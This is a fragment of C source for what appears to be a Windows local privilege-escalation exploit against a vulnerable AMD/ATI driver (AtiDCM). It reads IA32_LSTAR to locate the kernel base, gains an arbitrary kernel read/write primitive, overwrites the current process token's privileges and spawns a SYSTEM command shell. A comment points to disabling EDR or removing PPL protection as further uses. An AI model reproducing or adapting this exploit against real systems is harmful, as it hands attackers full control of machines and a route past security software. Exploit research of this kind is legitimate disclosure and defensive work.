	printf("[*] Writing token privileges...\n");
#ifdef _DEBUG
	getchar();
#endif
	KWrite((PVOID)((DWORD64)tokenAddr + 0x40), (PBYTE) & privs, sizeof(privs));

	printf("[*] Reading modified token privileges...\n");
	_SEP_TOKEN_PRIVILEGES modified_privs = { 0 };
	KRead((PVOID)((DWORD64)tokenAddr + 0x40), (PBYTE)&modified_privs, sizeof(modified_privs));
	printf("[+] modified_privs.Present = 0x%llx\n", modified_privs.Present);
	printf("[+] modified_privs.Enabled = 0x%llx\n", modified_privs.Enabled);
	printf("[+] modified_privs.EnabledByDefault = 0x%llx\n", modified_privs.EnabledByDefault);
	return;
}

int main()
{
//#ifndef _DEBUG
	DWORD bytesRet = 0;


	g_device = CreateFileA(
		"\\\\.\\AtiDCM",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);



	if (g_device == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to open handle to device.");
		return -1;
	}

	printf("[+] Opened handle to device: 0x%8p\n", g_device);
//#endif


	char* outputBuffer = (char*)VirtualAlloc(
		NULL,
		SIZE_BUF,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);


	memset(outputBuffer, 0x0, SIZE_BUF);

	if (readMSR(IA32_LSTAR, outputBuffer, SIZE_BUF)) {
		printf("[+] readMSR success.\n");
		printf("[+] IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 12)));
		//printf("[+] IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 4)));
		g_kisystemcall64 = *((DWORD64*)(outputBuffer + 12));
		g_ntbase = (DWORD64)g_kisystemcall64 - 0x42b700;
		printf("[+] g_ntbase = 0x%p\n", g_ntbase);
	}
#ifndef TOKENPRIV
	if (!prepare())
		return -1;
#endif
	arbitraryCallDriver(outputBuffer, SIZE_BUF);
	printf("[+] arbitraryCallDriver returned successfully.\n");

#ifndef TOKENPRIV
	//Now you should have arbitrary kernel R/W primitive with iorings.
	//You can do whatever you want here, like disable EDR, remove PPL attributes from processes or add yourself as PPL process.
	//This POC just increment privileges.
	IncrementPrivileges();
	printf("[+] privileges incremented successfully.\n");
#ifdef _DEBUG
	getchar();
#endif
	cleanup();

#endif
	printf("[*] spawning system shell...\n");
	system("cmd.exe");
	return 0;
}